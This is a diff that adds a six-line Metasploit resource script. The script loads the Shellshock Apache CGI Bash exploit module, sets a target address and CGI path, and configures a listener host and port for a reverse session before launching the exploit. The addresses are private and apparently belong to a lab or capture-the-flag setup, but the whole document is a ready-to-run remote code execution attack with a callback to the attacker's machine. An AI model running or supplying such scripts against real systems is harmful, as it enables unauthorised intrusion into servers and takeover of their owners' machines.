@@ -1,0 +1,6 @@
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+set RHOSTS 10.10.11.87
+set LHOST 10.10.15.57
+set LPORT 4444
+set TARGETURI /cgi-bin/vulnerable
+exploit -j -z
